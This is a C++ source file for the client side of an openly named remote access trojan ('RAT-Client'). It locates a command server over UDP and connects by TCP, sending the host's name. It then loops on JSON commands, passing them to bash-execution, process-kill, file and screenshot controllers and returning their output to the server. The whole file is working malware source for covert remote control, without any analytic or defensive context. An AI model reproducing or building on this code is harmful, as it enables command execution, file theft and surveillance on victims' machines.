#include "ClientManager.hpp"
#include "ClientPingController.hpp"
#include "ClientBashController.hpp"
#include "ClientKillController.hpp"
#include "ClientFileController.hpp"
#include "ClientScreenshotController.hpp"
#include <iostream>
#include <thread>
#include <cstdio>
#include <cerrno>
#include <cstring>
#include <sys/wait.h>
#include <unistd.h>
#include <map>
#include <memory>

namespace Client {

std::shared_ptr<ClientManager> ClientManager::getInstance() {
    if (!ClientManager::instance) {
        
        
        std::lock_guard<std::mutex> lock(ClientManager::initMutex);
        
        if (!ClientManager::instance) ClientManager::instance.reset(new ClientManager());
    }
    return ClientManager::instance;
}

ClientManager::ClientManager() = default;
ClientManager::~ClientManager() {
    std::lock_guard<std::mutex> lock(mtx);
    
    if (socket) socket->close();
    socket.reset();
    controllers.clear();
}

bool ClientManager::connectTo(const std::string &name, const sf::IpAddress &address, unsigned short port) {
    std::lock_guard<std::mutex> lock(mtx);
    
    if (name.empty()) return false;
    if (port == 0) return false;
    if (socket) return false;
    
    socket = std::make_shared<Utils::TCPSocket>();
    if (!socket->connect(address, port)) {
        socket.reset();
        return false;
    }
    
    
    nlohmann::json handshake;
    handshake["controller"] = "system";
    handshake["msg"] = "Hello from RAT-Client";
    handshake["version"] = "1.0";
    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        handshake["hostname"] = std::string(hostname);
    }
    
    std::string jsonStr = handshake.dump();
    if (!socket->send(jsonStr)) {
        socket->close();
        socket.reset();
        return false;
    }
    
    controllers.emplace(std::piecewise_construct,
                         std::forward_as_tuple(name),
                         std::forward_as_tuple(socket));
    return true;
}

void ClientManager::disconnect(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx);
    
    if (socket) {
        socket->close();
        socket.reset();
    }
    controllers.erase(name);
}

bool ClientManager::isConnected(const std::string &name) const {
    std::lock_guard<std::mutex> lock(mtx);
    return socket != nullptr && controllers.find(name) != controllers.end();
}

ClientController *ClientManager::getController(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx);
    auto it = controllers.find(name);
    if (it == controllers.end()) return nullptr;
    return &it->second;
}

int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
    const std::string name = "main";
    
    ClientPingController pingCtrl;
    unsigned short udpPort = port;
    
    while (true) {
        if (pingCtrl.discoverServer(address, udpPort, 3, 300)) {
            if (connectTo(name, address, port)) break;
        }
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
    
    ClientController *ctrl = getController(name);
    if (!ctrl) return 2;

    
    std::map<std::string, std::unique_ptr<IClientController>> clientControllers;
    clientControllers["bash"] = std::make_unique<ClientBashController>();
    clientControllers["kill"] = std::make_unique<ClientKillController>();
    clientControllers["file"] = std::make_unique<ClientFileController>();
    clientControllers["screenshot"] = std::make_unique<ClientScreenshotController>();

    while (isConnected(name)) {
        nlohmann::json in;
        if (!ctrl->receiveJson(in)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        if (in.contains("controller") && in["controller"].is_string() && 
            in["controller"].get<std::string>() == "ping") {
            continue;
        }
        
        if (in.contains("controller") && in["controller"].is_string()) {
            std::string controllerHandle = in["controller"].get<std::string>();
            
            auto it = clientControllers.find(controllerHandle);
            if (it != clientControllers.end()) {
                nlohmann::json reply = it->second->handleCommand(in);
                ctrl->sendJson(reply);
                
                if (reply.contains("exit") && reply["exit"].is_boolean() && reply["exit"].get<bool>()) {
                    break;
                }
            } else {
                nlohmann::json reply;
                reply["controller"] = "error";
                reply["out"] = "Unknown controller: " + controllerHandle;
                reply["ret"] = -1;
                ctrl->sendJson(reply);
            }
        }
    }

    disconnect(name);
    return 0;
}

} 
